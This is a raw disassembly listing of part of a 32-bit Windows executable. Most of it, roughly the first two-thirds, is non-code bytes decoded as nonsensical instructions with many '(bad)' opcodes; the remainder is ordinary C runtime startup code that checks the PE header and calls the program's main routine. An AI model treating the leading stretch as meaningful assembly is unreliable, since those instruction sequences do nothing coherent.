  422410:	test   DWORD PTR [ebp-0x6270e963],eax
  422416:	cmp    BYTE PTR [ebp-0x2d5b3528],ah
  42241c:	popa   
  42241d:	pop    es
  42241e:	mov    esp,0x5bd889cf
  422423:	dec    ebx
  422424:	pop    ebp
  422425:	cs ds and ch,al
  422429:	cmp    eax,0x4e575c6
  42242e:	sub    DWORD PTR fs:[edx-0x58],esp
  422432:	dec    eax
  422433:	sbb    eax,DWORD PTR [edx+0x9773a5d]
  422439:	jle    0x42248b
  42243b:	jecxz  0x42246a
  42243d:	pop    ss
  42243e:	adc    edi,esp
  422440:	add    edx,DWORD PTR [ebx]
  422442:	scas   eax,DWORD PTR es:[edi]
  422443:	out    dx,eax
  422444:	cmp    ebp,ebx
  422446:	jmp    0x214a:0x8f2c569b
  42244d:	out    dx,al
  42244e:	retf   
  42244f:	imul   ebp,edi,0x4c1202da
  422455:	fwait
  422456:	pop    ds
  422457:	cmp    DWORD PTR [edx+0x5e],edi
  42245a:	(bad)  
  42245b:	cmp    edx,DWORD PTR [ecx+esi*4-0x70]
  42245f:	inc    ebp
  422460:	jg     0x42248e
  422462:	fstp   QWORD PTR [ecx]
  422464:	rcl    DWORD PTR [esi-0xa],0xda
  422468:	sahf   
  422469:	xchg   ecx,eax
  42246a:	xor    eax,0xa64cfe33
  42246f:	(bad)  [ebx+0xd]
  422472:	xchg   ebp,eax
  422473:	(bad)  
  422474:	sub    dl,BYTE PTR [ebp+0x52]
  422477:	xchg   esp,eax
  422478:	(bad)  
  422479:	xchg   ebx,eax
  42247a:	daa    
  42247b:	push   0x5b
  42247d:	mov    ecx,0x58e138ab
  422482:	retf   0xf8c4
  422485:	jnp    0x4224bd
  422487:	lods   al,BYTE PTR ds:[esi]
  422488:	inc    ecx
  422489:	in     al,0xa6
  42248b:	call   0xc787135f
  422490:	popa   
  422491:	pop    ebx
  422492:	xchg   DWORD PTR [edx],ebp
  422494:	pop    eax
  422495:	pop    ss
  422496:	aaa    
  422497:	and    DWORD PTR [edi-0x62],edi
  42249a:	mov    al,0x3f
  42249c:	imul   BYTE PTR [edi+0x618a584]
  4224a2:	imul   edx,DWORD PTR [esi-0x5b],0xffffffe6
  4224a6:	lock mov edi,0x3ad79ba
  4224ac:	adc    bl,BYTE PTR ds:0x7aab607d
  4224b2:	rcl    BYTE PTR [esi],cl
  4224b4:	ds dec ebp
  4224b6:	pop    edi
  4224b7:	cmp    eax,0xb6d631be
  4224bc:	(bad)  
  4224bd:	mov    ebp,0x624b0398
  4224c2:	pusha  
  4224c3:	jb     0x42253e
  4224c5:	sbb    BYTE PTR [edi+0x3dff3f35],cl
  4224cb:	test   BYTE PTR [ebx-0xe],0x9d
  4224cf:	jnp    0x4224a3
  4224d1:	(bad)
  4224d4:	cld    
  4224d5:	and    eax,DWORD PTR [ebp+0x5f]
  4224d8:	sub    al,0xc5
  4224da:	jnp    0x422463
  4224dc:	mov    edi,0xe77f34f9
  4224e1:	and    BYTE PTR [eax+eax*8-0x5ff197ed],0x8c
  4224e9:	ds (bad) 
  4224eb:	iret   
  4224ec:	icebp  
  4224ed:	jp     0x4224cf
  4224ef:	fisub  DWORD PTR [edi+edi*2+0x7a]
  4224f3:	pop    edi
  4224f4:	push   esi
  4224f5:	xor    ecx,DWORD PTR [edx]
  4224f7:	mov    dh,0x68
  4224f9:	leave  
  4224fa:	cld    
  4224fb:	push   edi
  4224fc:	dec    ebx
  4224fd:	mov    ?,ecx
  4224ff:	cmp    DWORD PTR [edi+0x1d],edi
  422502:	fcmovu st,st(6)
  422504:	xor    al,0x80
  422506:	in     eax,dx
  422507:	mov    bh,0x68
  422509:	jae    0x422513
  42250b:	jg     0x4224a2
  42250d:	mov    cl,0x8d
  42250f:	mov    ds:0x1e0477ca,eax
  422514:	arpl   WORD PTR [eax+ecx*2-0x40c2e141],bp
  42251b:	fidivr WORD PTR [eax]
  42251d:	ret    
  42251e:	das    
  42251f:	shl    BYTE PTR [ecx],cl
  422521:	xchg   esp,eax
  422522:	push   0x43672afa
  422527:	mov    ds:0x1fe7cd10,al
  42252c:	sar    cl,0x9c
  42252f:	jae    0x42257d
  422531:	sbb    eax,0x65e2630f
  422536:	fist   WORD PTR [ebx]
  422538:	pop    ecx
  422539:	pop    ecx
  42253a:	jecxz  0x42255e
  42253c:	inc    esi
  42253d:	int    0xca
  42253f:	fnstcw WORD PTR [esi+0x70c70351]
  422545:	pop    es
  422546:	(bad)  
  422547:	ds pop edi
  422549:	inc    ecx
  42254a:	mov    eax,ds:0x81463d59
  42254f:	jmp    0x4a5337fc
  422554:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422555:	mov    al,0x56
  422557:	ror    BYTE PTR [esi+0x3],0x84
  42255b:	pop    ds
  42255c:	in     al,0xb8
  42255e:	mov    cl,BYTE PTR [ecx+0x15]
  422561:	jg     0x4225ac
  422563:	aaa    
  422564:	(bad)  
  422565:	pop    ebp
  422566:	pop    es
  422567:	out    0x39,eax
  422569:	sbb    edi,DWORD PTR [ebx]
  42256b:	leave  
  42256c:	adc    eax,0x60838ac
  422571:	add    ebx,edi
  422573:	shr    BYTE PTR [eax],cl
  422575:	xchg   esp,eax
  422576:	(bad)  
  422577:	ror    BYTE PTR [ecx],cl
  422579:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42257a:	mov    bl,0x5
  42257c:	mov    al,ds:0x146ecb3
  422581:	jo     0x4225cc
  422583:	out    0x48,al
  422585:	js     0x422519
  422587:	sahf   
  422588:	dec    ebx
  422589:	inc    esi
  42258a:	sbb    DWORD PTR cs:[edi+0x9],ebp
  42258e:	ficomp DWORD PTR [edx+0x66]
  422591:	xchg   ecx,eax
  422592:	aaa    
  422593:	xor    DWORD PTR [edi+edx*2],ebp
  422596:	pop    edx
  422597:	scas   eax,DWORD PTR es:[edi]
  422598:	aas    
  422599:	push   eax
  42259a:	iret   
  42259b:	aad    0x64
  42259d:	or     al,0x32
  42259f:	and    dh,dl
  4225a1:	paddusb mm6,QWORD PTR [eax]
  4225a4:	adc    edi,DWORD PTR [ecx]
  4225a6:	ror    DWORD PTR [ebx-0x3a5e9a55],1
  4225ac:	and    eax,0x311122db
  4225b1:	fwait
  4225b2:	icebp  
  4225b3:	cs loope 0x422625
  4225b6:	pop    ebx
  4225b7:	test   al,0x5d
  4225b9:	add    BYTE PTR [ecx],ch
  4225bb:	cmp    al,0x4b
  4225bd:	push   edi
  4225be:	(bad)  
  4225bf:	sbb    DWORD PTR [edi],eax
  4225c1:	cld    
  4225c2:	(bad)  
  4225c3:	int    0x1e
  4225c5:	push   0x3b
  4225c7:	jl     0x4225c4
  4225c9:	or     esp,esp
  4225cb:	or     al,BYTE PTR [ecx+ebx*1-0x45d931a9]
  4225d2:	mov    al,ds:0x22f361e5
  4225d7:	pop    edi
  4225d8:	test   al,0x44
  4225da:	push   edx
  4225db:	sub    dh,BYTE PTR [esi-0x60]
  4225de:	bound  ebp,QWORD PTR [edi+ecx*1-0x63c2e501]
  4225e5:	adc    ebp,ebx
  4225e7:	test   BYTE PTR [esi-0x5b],ch
  4225ea:	sbb    al,0x6b
  4225ed:	push   esi
  4225ee:	popf   
  4225ef:	sub    BYTE PTR [edx-0x6e],0x9b
  4225f3:	pop    eax
  4225f4:	mov    ds:0xfd041ded,al
  4225f9:	mov    edi,0x14ac6374
  4225fe:	dec    ebp
  4225ff:	mov    esi,0x6bec00d4
  422604:	ds ds inc ebx
  422607:	ins    DWORD PTR es:[edi],dx
  422608:	cmp    eax,0x42c2c546
  42260d:	jae    0x42260a
  42260f:	cmp    edi,DWORD PTR [edx-0x16]
  422612:	mov    eax,0xf474ea94
  422617:	sar    ch,0x1f
  42261a:	push   0xca17b58b
  42261f:	mov    ch,0x82
  422621:	inc    ebp
  422622:	or     al,0x7b
  422624:	(bad)  
  422625:	imul   esp,DWORD PTR [edx-0x66],0x9
  422629:	out    dx,eax
  42262a:	aad    0x66
  42262c:	rcr    esp,0x77
  42262f:	ins    BYTE PTR es:[edi],dx
  422630:	in     eax,0xc0
  422632:	test   eax,0xc6fa751c
  422637:	pop    eax
  422638:	pop    ecx
  422639:	xor    DWORD PTR [ebx],esp
  42263b:	pop    es
  42263c:	arpl   WORD PTR [ebx+edi*2-0xd9bd499],sp
  422643:	xchg   ebp,eax
  422644:	lds    ecx,FWORD PTR [edi-0x7a69c836]
  42264a:	or     BYTE PTR [esi+0x5620981a],bh
  422650:	add    al,0x92
  422652:	add    DWORD PTR [ebx],edx
  422654:	and    eax,0xa84d42f8
  422659:	enter  0x95e9,0xca
  42265d:	(bad)  [ebx+eax*1-0x47]
  422661:	int3   
  422662:	cdq    
  422663:	(bad)  
  422664:	ds pop ebp
  422666:	js     0x42263c
  422668:	shl    BYTE PTR [ecx-0x7d056507],0x53
  42266f:	cmp    dl,BYTE PTR [eax+esi*4+0x4d]
  422673:	fs push es
  422675:	int    0x1b
  422677:	jnp    0x42263f
  422679:	pop    esi
  42267a:	cmp    BYTE PTR [edi+0x5810dc5a],cl
  422680:	mov    al,0xb2
  422682:	sub    BYTE PTR [ebx],dh
  422684:	fldcw  WORD PTR [ebx]
  422686:	dec    esi
  422687:	out    0x1e,eax
  422689:	ret    
  42268a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42268b:	xchg   esi,eax
  42268c:	nop
  42268d:	sbb    al,0x72
  42268f:	and    dl,cl
  422691:	inc    edx
  422692:	cdq    
  422693:	add    bl,bl
  422695:	and    al,0x81
  422697:	jle    0x42261a
  422699:	xchg   ecx,eax
  42269a:	adc    bl,BYTE PTR [ecx+0x65]
  42269d:	mov    ebp,0xd85a80f8
  4226a2:	mov    eax,0x31b91119
  4226a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226a8:	loope  0x4226aa
  4226aa:	jmp    FWORD PTR [ebx]
  4226ac:	or     dl,BYTE PTR [ecx+0x64cc9c24]
  4226b2:	lea    ebx,[esi+ebp*2+0x42]
  4226b6:	cli    
  4226b7:	cld    
  4226b8:	gs scas al,BYTE PTR es:[edi]
  4226ba:	or     DWORD PTR [ebx],edi
  4226bc:	jbe    0x422713
  4226be:	and    DWORD PTR [edi+ecx*4+0x24],ebp
  4226c2:	xchg   edx,eax
  4226c3:	rcr    DWORD PTR ds:0x9c15068a,cl
  4226c9:	add    DWORD PTR [ebp-0x3287cec9],eax
  4226cf:	adc    BYTE PTR [eax-0x70ceb087],al
  4226d5:	cmp    dl,BYTE PTR [esi]
  4226d7:	or     al,0xa6
  4226d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226da:	sti    
  4226db:	cli    
  4226dc:	xor    eax,0xedda7e28
  4226e1:	inc    edx
  4226e2:	push   ebp
  4226e3:	jne    0x4226a7
  4226e5:	ja     0x422724
  4226e7:	iret   
  4226e8:	jns    0x422704
  4226ea:	push   ebp
  4226eb:	sbb    DWORD PTR [eax+0x7e],ebp
  4226ee:	(bad)  
  4226ef:	jge    0x422716
  4226f1:	cli    
  4226f2:	jmp    0xf6ebc733
  4226f7:	adc    DWORD PTR [esi],ebp
  4226f9:	dec    ecx
  4226fa:	out    0x7f,al
  4226fc:	mov    BYTE PTR [ebp+0x5facd40d],dl
  422702:	ror    BYTE PTR [ebx+0x640f403f],0xb7
  422709:	mov    ds,WORD PTR [eax]
  42270b:	xchg   ecx,eax
  42270c:	mov    ds:0x4c129a34,al
  422711:	or     BYTE PTR [ecx],bh
  422713:	retf   
  422714:	xchg   DWORD PTR [edx],esp
  422716:	mov    edi,DWORD PTR [edx+eax*1]
  422719:	cld    
  42271a:	xchg   edi,eax
  42271b:	into   
  42271c:	aad    0xcf
  42271e:	mov    WORD PTR [edi],?
  422720:	ins    DWORD PTR es:[edi],dx
  422721:	pop    es
  422722:	xor    BYTE PTR [ebx+edi*8-0x74],ch
  422726:	push   ss
  422727:	sbb    al,0x60
  422729:	cmp    esp,eax
  42272b:	int3   
  42272c:	xor    BYTE PTR [ecx-0x4196736a],dl
  422732:	aam    0xda
  422734:	fs aad 0x4a
  422737:	adc    ebp,eax
  422739:	ret    
  42273a:	mov    dh,0x85
  42273c:	and    edx,DWORD PTR [eax+0x735a5eb6]
  422742:	mov    dl,0xf6
  422744:	and    bl,BYTE PTR [esi-0x62c31400]
  42274a:	pop    esi
  42274b:	rcr    ah,1
  42274d:	out    dx,eax
  42274e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42274f:	mov    ebx,0x764deff4
  422754:	sti    
  422755:	sbb    DWORD PTR [ebx],0xffffffc8
  422758:	in     eax,0x72
  42275a:	sub    cl,BYTE PTR [ebp-0x816203f]
  422760:	inc    ecx
  422761:	adc    al,0xca
  422763:	jbe    0x42277e
  422765:	adc    al,0xd2
  422767:	push   edi
  422768:	gs hlt 
  42276a:	pop    edx
  42276b:	(bad)  
  42276d:	aam    0x17
  42276f:	push   esi
  422770:	jb     0x4227ec
  422772:	in     al,0xd0
  422774:	pop    ebx
  422776:	mov    edi,0x73c73485
  42277b:	jno    0x42279a
  42277d:	(bad)  
  42277e:	loopne 0x42271d
  422780:	and    DWORD PTR [esi],esi
  422782:	ror    BYTE PTR [edx-0x3f],0x1d
  422786:	scas   al,BYTE PTR es:[edi]
  422787:	adc    dh,BYTE PTR [edx-0x5e3edd9a]
  42278d:	pushf  
  42278e:	or     ch,BYTE PTR [ecx+ebp*2]
  422791:	sub    dl,al
  422793:	mov    bh,BYTE PTR [ebp+0x1c]
  422796:	fwait
  422797:	test   eax,0xc0b1ddc1
  42279c:	adc    eax,0xc0893d8e
  4227a1:	pop    ds
  4227a2:	sbb    al,0x39
  4227a4:	mov    bl,0xc0
  4227a6:	inc    esp
  4227a7:	into   
  4227a8:	cmc    
  4227a9:	mov    es:0x286d0928,eax
  4227af:	shl    DWORD PTR [esi],1
  4227b1:	sbb    edi,ebp
  4227b3:	data16 add bh,BYTE PTR [eax+0x53]
  4227b7:	lds    eax,FWORD PTR [ebx+0xd]
  4227ba:	or     eax,0x8d59d17d
  4227bf:	dec    ebp
  4227c0:	adc    al,0x3e
  4227c2:	push   ss
  4227c3:	add    al,0x68
  4227c5:	inc    esi
  4227c6:	push   es
  4227c7:	xor    edi,DWORD PTR [ecx]
  4227c9:	sbb    eax,0x802c608e
  4227ce:	pop    ebp
  4227cf:	inc    edx
  4227d0:	pop    eax
  4227d1:	popa   
  4227d2:	(bad)  [edx-0x71]
  4227d5:	(bad)  
  4227d7:	or     al,0xf2
  4227d9:	stos   BYTE PTR es:[edi],al
  4227da:	sbb    BYTE PTR [ebx+0x6d],0x4c
  4227de:	(bad)  
  4227df:	clc    
  4227e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4227e1:	jl     0x4227a7
  4227e3:	push   edx
  4227e4:	bound  esi,QWORD PTR [ebx]
  4227e6:	mov    ebp,0x1e56cd57
  4227eb:	add    cl,BYTE PTR [eax-0x2d1ac014]
  4227f1:	jno    0x422783
  4227f3:	in     eax,dx
  4227f4:	push   es
  4227f5:	(bad)  
  4227f6:	cdq    
  4227f7:	mov    ch,BYTE PTR [edx-0x9caecb8]
  4227fd:	and    esp,DWORD PTR [edi]
  4227ff:	mov    bl,0x38
  422801:	jne    0x4227b9
  422803:	icebp  
  422804:	xchg   ecx,eax
  422805:	pop    ss
  422806:	mov    dh,0x7f
  422808:	sbb    esi,edx
  42280a:	outs   dx,DWORD PTR ds:[esi]
  42280b:	gs adc eax,0xe67b78b1
  422811:	shl    DWORD PTR [edx+0x6f3fd46e],1
  422817:	(bad)  
  422818:	fdivrp st(2),st
  42281a:	or     eax,0xf55e6a9e
  42281f:	xchg   ecx,eax
  422820:	and    DWORD PTR [ecx],0x86e49b88
  422826:	pusha  
  422827:	jno    0x422802
  422829:	aaa    
  42282a:	out    dx,al
  42282b:	push   0x700f1757
  422830:	jae    0x422803
  422832:	out    0x2c,eax
  422834:	das    
  422835:	xchg   esi,eax
  422836:	nop
  422837:	add    ebx,ecx
  422839:	(bad)  
  42283b:	in     eax,0x82
  42283d:	es popf 
  42283f:	mov    eax,ds:0x53c1a9b5
  422844:	mov    ebp,0xcff03df4
  422849:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42284a:	fisttp QWORD PTR [ebp+0x48]
  42284d:	gs aad 0x17
  422850:	pop    esi
  422851:	sub    esp,ebp
  422853:	jle    0x4228a6
  422855:	fldenv [edx+0x64]
  422858:	(bad)  
  422859:	pop    edx
  42285a:	mov    eax,0xd104182
  42285f:	fld    TBYTE PTR [edi-0x5966f3d0]
  422865:	aam    0xe0
  422867:	dec    edi
  422868:	push   ebx
  422869:	jb     0x422860
  42286b:	mov    esp,0x4846a3a1
  422870:	push   esp
  422871:	inc    eax
  422872:	dec    BYTE PTR [edx]
  422874:	mov    al,0xd4
  422876:	sub    DWORD PTR [edi+0x13f3d56a],ebp
  42287c:	xor    al,0xba
  42287e:	jmp    FWORD PTR [edx-0x32]
  422881:	pushf  
  422882:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422883:	fdiv   st(7),st
  422885:	daa    
  422886:	in     al,0xc3
  422888:	fidiv  DWORD PTR ds:[eax-0x24a4037]
  42288f:	mov    cl,0x7d
  422891:	mov    DWORD PTR [ecx],0xe93eb3b0
  422897:	mov    esp,0x8a5afe2a
  42289c:	adc    eax,0x6b03cb8f
  4228a1:	sub    edx,0x5a0a8997
  4228a7:	call   0x6fcca439
  4228ac:	push   esi
  4228ad:	scas   eax,DWORD PTR es:[edi]
  4228ae:	add    DWORD PTR [edi-0x185706b3],ecx
  4228b4:	rcr    al,0x90
  4228b7:	xor    eax,0x9f1c86e8
  4228bc:	pop    esi
  4228bd:	cwde   
  4228be:	push   ebx
  4228bf:	jne    0x422922
  4228c1:	xlat   BYTE PTR ds:[ebx]
  4228c2:	jmp    0x7b6d:0x40528e36
  4228c9:	rol    BYTE PTR [edx+0x72],1
  4228cc:	and    eax,0x69f28457
  4228d1:	xchg   BYTE PTR [ecx-0x45872973],ch
  4228d7:	inc    edi
  4228d8:	mov    dl,0xd0
  4228da:	and    dl,BYTE PTR [ecx+0x4d]
  4228dd:	aaa    
  4228de:	mov    ebp,0x673400ba
  4228e3:	sub    eax,0x889967fc
  4228e8:	jmp    0x586de523
  4228ed:	inc    ebp
  4228ee:	test   al,0x31
  4228f0:	test   BYTE PTR [ecx],cl
  4228f2:	addr16 ds push ebx
  4228f5:	and    edx,ebx
  4228f7:	dec    ebp
  4228f8:	xor    DWORD PTR [eax+0x4569dd69],edi
  4228fe:	mov    dh,0xa5
  422900:	xchg   edx,eax
  422901:	or     eax,DWORD PTR [eax+0x6f26ee2]
  422907:	add    bh,BYTE PTR [eax+0x2faa3a28]
  42290d:	out    0xed,eax
  42290f:	daa    
  422910:	and    eax,0x3bb071ed
  422915:	push   eax
  422916:	cld    
  422917:	(bad)  
  422918:	ins    DWORD PTR es:[edi],dx
  422919:	lock sbb DWORD PTR [eax+0xe],esp
  42291d:	fisub  DWORD PTR [edi]
  42291f:	jecxz  0x422936
  422921:	in     eax,dx
  422922:	add    bh,dl
  422924:	mov    ah,0xa3
  422926:	adc    al,0x1a
  422928:	popa   
  422929:	push   0x9748374b
  42292e:	call   0xc79f6517
  422933:	jg     0x4228cd
  422935:	sub    DWORD PTR ss:[ebx],ebx
  422938:	js     0x422950
  42293a:	cwde   
  42293b:	cwde   
  42293c:	pop    esp
  42293d:	xchg   ebp,eax
  42293e:	sbb    al,0x1d
  422940:	push   eax
  422941:	pop    ecx
  422942:	dec    edi
  422943:	and    esp,DWORD PTR [edx+0x761d85fc]
  422949:	sub    al,0x4c
  42294b:	adc    BYTE PTR [esi+ebp*8-0x4f71e59f],dl
  422952:	mov    ebp,0xf8ae298e
  422957:	lds    ebp,FWORD PTR [ebx-0xf4be64c]
  42295d:	test   DWORD PTR [eax],edi
  42295f:	push   es
  422960:	pop    ebx
  422961:	inc    esi
  422962:	mov    cl,0x95
  422964:	(bad)  
  422965:	mov    eax,ds:0x1b3da725
  42296a:	inc    esi
  42296b:	das    
  42296c:	xchg   edx,eax
  42296d:	xchg   esi,eax
  42296e:	push   eax
  42296f:	and    esi,DWORD PTR [edi]
  422971:	xchg   ebp,eax
  422972:	xor    eax,0x9ec2f62f
  422977:	es mov esp,0xe737d699
  42297d:	shr    ah,cl
  42297f:	lods   eax,DWORD PTR ds:[esi]
  422980:	test   ah,bh
  422982:	out    dx,al
  422983:	and    al,0x8c
  422985:	aas    
  422986:	or     eax,DWORD PTR [ebx]
  422988:	imul   edi,DWORD PTR [ecx+0x29f1f9bf],0xd1ce85c3
  422992:	pop    edi
  422993:	sub    edx,esi
  422995:	inc    esp
  422996:	les    edi,FWORD PTR [edi]
  422998:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422999:	pop    es
  42299a:	lds    ebp,FWORD PTR [ebp+ebx*4+0x5044da71]
  4229a1:	pop    ss
  4229a2:	int    0x6c
  4229a4:	jbe    0x4229b1
  4229a6:	adc    eax,0x21a50b9c
  4229ab:	cld    
  4229ac:	ds in  al,dx
  4229ae:	jno    0x422940
  4229b0:	inc    ebx
  4229b1:	in     eax,dx
  4229b2:	sbb    eax,0xd61d691c
  4229b7:	and    dh,BYTE PTR [esi]
  4229b9:	cld    
  4229ba:	adc    eax,0xb3b8f10c
  4229bf:	leave  
  4229c0:	lock mov esi,0x95d94ce8
  4229c6:	bound  ebx,QWORD PTR [esi]
  4229c8:	jecxz  0x422a0b
  4229ca:	pushf  
  4229cb:	fst    QWORD PTR [esi]
  4229cd:	fistp  WORD PTR [edi+0x31]
  4229d0:	jae    0x422a01
  4229d2:	shl    DWORD PTR [ecx+0x17],0x3d
  4229d6:	rol    BYTE PTR [eax+0x3e],1
  4229d9:	call   0x25db7ea0
  4229de:	push   0xffffffec
  4229e0:	mov    ebp,0xf966eda
  4229e5:	es fs cmp al,dh
  4229e9:	(bad)  
  4229ea:	cmp    DWORD PTR ds:0x71519f56,esp
  4229f0:	mov    al,0xbf
  4229f2:	adc    eax,0x15ff006a
  4229f7:	cmp    al,0x81
  4229f9:	inc    edx
  4229fa:	add    BYTE PTR [edx+0x0],ch
  4229fd:	push   0x0
  4229ff:	call   DWORD PTR ds:0x428030
  422a05:	xor    eax,eax
  422a07:	add    esp,0x10
  422a0a:	ret    0x10
  422a0d:	nop
  422a0e:	nop
  422a0f:	nop
  422a10:	jmp    DWORD PTR ds:0x428130
  422a16:	cmp    DWORD PTR ds:0x464d5c,0x1
  422a1d:	jne    0x422a24
  422a1f:	call   0x422f62
  422a24:	push   DWORD PTR [esp+0x4]
  422a28:	call   0x422deb
  422a2d:	push   0xff
  422a32:	call   DWORD PTR ds:0x46444c
  422a38:	pop    ecx
  422a39:	pop    ecx
  422a3a:	ret    
  422a3b:	cmp    DWORD PTR ds:0x464d5c,0x1
  422a42:	jne    0x422a49
  422a44:	call   0x422f62
  422a49:	push   DWORD PTR [esp+0x4]
  422a4d:	call   0x422deb
  422a52:	push   0xff
  422a57:	call   0x422c31
  422a5c:	pop    ecx
  422a5d:	pop    ecx
  422a5e:	ret    
  422a5f:	push   0x60
  422a61:	push   0x428168
  422a66:	call   0x423950
  422a6b:	mov    edi,0x94
  422a70:	mov    eax,edi
  422a72:	call   0x4239a0
  422a77:	mov    DWORD PTR [ebp-0x18],esp
  422a7a:	mov    esi,esp
  422a7c:	mov    DWORD PTR [esi],edi
  422a7e:	push   esi
  422a7f:	call   DWORD PTR ds:0x428068
  422a85:	mov    ecx,DWORD PTR [esi+0x10]
  422a88:	mov    DWORD PTR ds:0x464d64,ecx
  422a8e:	mov    eax,DWORD PTR [esi+0x4]
  422a91:	mov    ds:0x464d70,eax
  422a96:	mov    edx,DWORD PTR [esi+0x8]
  422a99:	mov    DWORD PTR ds:0x464d74,edx
  422a9f:	mov    esi,DWORD PTR [esi+0xc]
  422aa2:	and    esi,0x7fff
  422aa8:	mov    DWORD PTR ds:0x464d68,esi
  422aae:	cmp    ecx,0x2
  422ab1:	je     0x422abf
  422ab3:	or     esi,0x8000
  422ab9:	mov    DWORD PTR ds:0x464d68,esi
  422abf:	shl    eax,0x8
  422ac2:	add    eax,edx
  422ac4:	mov    ds:0x464d6c,eax
  422ac9:	xor    esi,esi
  422acb:	push   esi
  422acc:	mov    edi,DWORD PTR ds:0x428044
  422ad2:	call   edi
  422ad4:	cmp    WORD PTR [eax],0x5a4d
  422ad9:	jne    0x422afa
  422adb:	mov    ecx,DWORD PTR [eax+0x3c]
  422ade:	add    ecx,eax
  422ae0:	cmp    DWORD PTR [ecx],0x4550
  422ae6:	jne    0x422afa
  422ae8:	movzx  eax,WORD PTR [ecx+0x18]
  422aec:	cmp    eax,0x10b
  422af1:	je     0x422b12
  422af3:	cmp    eax,0x20b
  422af8:	je     0x422aff
  422afa:	mov    DWORD PTR [ebp-0x1c],esi
  422afd:	jmp    0x422b26
  422aff:	cmp    DWORD PTR [ecx+0x84],0xe
  422b06:	jbe    0x422afa
  422b08:	xor    eax,eax
  422b0a:	cmp    DWORD PTR [ecx+0xf8],esi
  422b10:	jmp    0x422b20
  422b12:	cmp    DWORD PTR [ecx+0x74],0xe
  422b16:	jbe    0x422afa
  422b18:	xor    eax,eax
  422b1a:	cmp    DWORD PTR [ecx+0xe8],esi
  422b20:	setne  al
  422b23:	mov    DWORD PTR [ebp-0x1c],eax
  422b26:	push   0x1
  422b28:	call   0x4238fd
  422b2d:	pop    ecx
  422b2e:	test   eax,eax
  422b30:	jne    0x422b3a
  422b32:	push   0x1c
  422b34:	call   0x422a3b
  422b39:	pop    ecx
  422b3a:	call   0x423874
  422b3f:	test   eax,eax
  422b41:	jne    0x422b4b
  422b43:	push   0x10
  422b45:	call   0x422a3b
  422b4a:	pop    ecx
  422b4b:	call   0x42375d
  422b50:	mov    DWORD PTR [ebp-0x4],esi
  422b53:	call   0x42355f
  422b58:	test   eax,eax
  422b5a:	jge    0x422b64
  422b5c:	push   0x1b
  422b5e:	call   0x422a16
  422b63:	pop    ecx
  422b64:	call   DWORD PTR ds:0x428064
  422b6a:	mov    ds:0x465514,eax
  422b6f:	call   0x42343d
  422b74:	mov    ds:0x464d54,eax
  422b79:	call   0x42339b
  422b7e:	test   eax,eax
  422b80:	jge    0x422b8a
  422b82:	push   0x8
  422b84:	call   0x422a16
  422b89:	pop    ecx
  422b8a:	call   0x423168
  422b8f:	test   eax,eax
  422b91:	jge    0x422b9b
  422b93:	push   0x9
  422b95:	call   0x422a16
  422b9a:	pop    ecx
  422b9b:	call   0x422c73
  422ba0:	mov    DWORD PTR [ebp-0x20],eax
  422ba3:	cmp    eax,esi
  422ba5:	je     0x422bae
  422ba7:	push   eax
  422ba8:	call   0x422a16
  422bad:	pop    ecx
  422bae:	mov    DWORD PTR [ebp-0x38],esi
  422bb1:	lea    eax,[ebp-0x64]
  422bb4:	push   eax
  422bb5:	call   DWORD PTR ds:0x428060
  422bbb:	call   0x4230ff
  422bc0:	mov    DWORD PTR [ebp-0x68],eax
  422bc3:	test   BYTE PTR [ebp-0x38],0x1
  422bc7:	je     0x422bcf
  422bc9:	movzx  eax,WORD PTR [ebp-0x34]
  422bcd:	jmp    0x422bd2
  422bcf:	push   0xa
  422bd1:	pop    eax
  422bd2:	push   eax
  422bd3:	push   DWORD PTR [ebp-0x68]
  422bd6:	push   esi
  422bd7:	push   esi
  422bd8:	call   edi
  422bda:	push   eax
  422bdb:	call   0x421880
  422be0:	mov    edi,eax
  422be2:	mov    DWORD PTR [ebp-0x6c],edi
  422be5:	cmp    DWORD PTR [ebp-0x1c],esi
  422be8:	jne    0x422bf0
  422bea:	push   edi
  422beb:	call   0x422dab
  422bf0:	call   0x422dcd
  422bf5:	jmp    0x422c22
  422bf7:	mov    eax,DWORD PTR [ebp-0x14]
  422bfa:	mov    ecx,DWORD PTR [eax]
  422bfc:	mov    ecx,DWORD PTR [ecx]
  422bfe:	mov    DWORD PTR [ebp-0x70],ecx
  422c01:	push   eax
  422c02:	push   ecx
  422c03:	call   0x422f9b
  422c08:	pop    ecx
  422c09:	pop    ecx
  422c0a:	ret    
  422c0b:	mov    esp,DWORD PTR [ebp-0x18]
  422c0e:	mov    edi,DWORD PTR [ebp-0x70]
  422c11:	cmp    DWORD PTR [ebp-0x1c],0x0
  422c15:	jne    0x422c1d
  422c17:	push   edi
  422c18:	call   0x422dbc
  422c1d:	call   0x422ddc
  422c22:	or     DWORD PTR [ebp-0x4],0xffffffff
  422c26:	mov    eax,edi
  422c28:	lea    esp,[ebp-0x7c]
  422c2b:	call   0x42398b
  422c30:	ret    
  422c31:	push   0x428184
  422c36:	call   DWORD PTR ds:0x428044
  422c3c:	test   eax,eax
  422c3e:	je     0x422c56
  422c40:	push   0x428174
  422c45:	push   eax
  422c46:	call   DWORD PTR ds:0x42804c
  422c4c:	test   eax,eax
  422c4e:	je     0x422c56
  422c50:	push   DWORD PTR [esp+0x4]
  422c54:	call   eax
  422c56:	push   DWORD PTR [esp+0x4]
  422c5a:	call   DWORD PTR ds:0x42806c
  422c60:	int3   
  422c61:	push   0x8
  422c63:	call   0x423b0f
  422c68:	pop    ecx
  422c69:	ret    
  422c6a:	push   0x8
  422c6c:	call   0x423a7b
  422c71:	pop    ecx
  422c72:	ret    
  422c73:	mov    eax,ds:0x465510
  422c78:	test   eax,eax
  422c7a:	je     0x422c7e
  422c7c:	call   eax
  422c7e:	push   esi
  422c7f:	push   edi
  422c80:	mov    ecx,0x42a00c
  422c85:	mov    edi,0x42a018
  422c8a:	xor    eax,eax
  422c8c:	cmp    ecx,edi
  422c8e:	mov    esi,ecx
  422c90:	jae    0x422ca9
  422c92:	test   eax,eax
  422c94:	jne    0x422cd5
